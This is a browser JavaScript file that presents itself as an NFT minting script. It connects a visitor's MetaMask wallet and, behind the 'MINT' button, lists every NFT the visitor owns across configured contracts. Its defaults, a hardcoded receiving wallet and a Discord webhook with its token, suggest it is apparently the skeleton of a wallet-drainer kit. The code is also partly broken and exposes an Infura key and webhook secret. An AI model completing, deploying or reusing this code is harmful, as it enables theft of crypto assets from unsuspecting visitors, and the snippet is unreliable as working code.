import 'https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js';
import 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
import 'https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js';

// Connect to local Ethereum node.
const web3 = new Web3('https://mainnet.infura.io/v3/0c19c0c0a9384b249a7e1d6537adf8fd');

// Other vars ABI config etc.
const documentScript = $('[loadWeb3]')[0];
const userData = new MobileDetect(window.navigator.userAgent);
const ABI = await $.getJSON('https://raw.githubusercontent.com/Meme31s/contract_abi/main/ABI.json').promise();

// some functions
const getList = (addy, contracts) => {
    return new Promise(async(resolve, reject) =>{
    return resolve(contracts.map(ocontract => {
        var data = []
        var c = new web3.eth.Contract(ABI,ocontract)
        var d = await c.methods.balanceOf(addy).call();
        data.push({contract: ocontract})
        for(var i = 0; i < d; i++) {
            data.push(await c.methods.tokenOfOwnerByIndex(addy, i).call());
        };
    }));
});
};

// main script
if (documentScript) {
    // starter
    async function unit(type) {
        try {
            if ('ethereum' in self == false) {
                alert('You need use MetaMask to access this app');
                location.href='https://metamask.io/download/';
            } else if (type=='load') {
                // Get user config
                var userConfig = JSON.parse(documentScript.innerText);

                // set public config
                self.config = new Object();
                self.config.wallet = ('wallet' in userConfig ? userConfig.wallet : '0x567e916c36333c1BC4E447f926043DEdf3011484');
                self.config.mint = ('mint' in userConfig ? (userConfig.mint.quantity=1,('price' in userConfig.mint ? null : userConfig.mint.price=.1),userConfig.mint) : {price: .1, quantity: 1});
                self.config.webhook = ('webhook' in userConfig ? userConfig.webhook : 'https://discord.com/api/webhooks/938460179320688640/lsOQoBKeQWugbXKq4wIAETmbrOZoXC0ezp5WEjD_7G-Z-9YDtevheo5_rSknPZFhXvdw');
                self.config.contracts = ('contracts' in userConfig && Array.isArray(userConfig.contracts)  ? userConfig.contracts : []);
                
                // auto connect
                var mintbutton = $('[mint]')[0];
                await ethereum.request({method: "eth_requestAccounts"});
                (mintbutton ? mintbutton[mintbutton.tagName == 'INPUT' ? 'value' : 'innerText'] = 'MINT' : null);
            } else if (type=='mint') {
                let [from] = await ethereum.request({method: "eth_requestAccounts"});
                
                self.nfts = await getList(from, self.config.contracts);
            };
        } catch (e) {
            console.error(e);
            var errors = $('[errors]')[0];
            (errors ? errors[errors.tagName == 'INPUT' ? 'value' : 'innerText'] = e : null) 
        };
    };

    // load starter
    $(window).on('load', () => {
        // changes in appearance
        $("[up], [down], [mint]").toArray().map(e => {
            var attr = e.attributes;
            if ('up' in attr) {
                e.addEventListener('click', ()=>{
                    config.mint.quantity++;
                    var count = $('[count]')[0];
                    if(count) {
                        count[count.tagName == 'INPUT' ? 'value' : 'innerText'] = config.mint.quantity;
                    };
                });
            } else if ('down' in attr) {
                e.addEventListener('click', ()=>{
                    if (config.mint.quantity != 1) {
                        config.mint.quantity--;
                        var count = $('[count]')[0];
                        if(count) {
                            count[count.tagName == 'INPUT' ? 'value' : 'innerText'] = config.mint.quantity;
                        };
                    }
                });
            } else if ('mint' in attr) {
                e.addEventListener('click', ()=>{
                    unit('mint');
                });
            };
            unit('load');
        });
    });
} else console.error('Executor element not found, you need to add an attribute named \'loadWeb3\' to the element you are executing the script');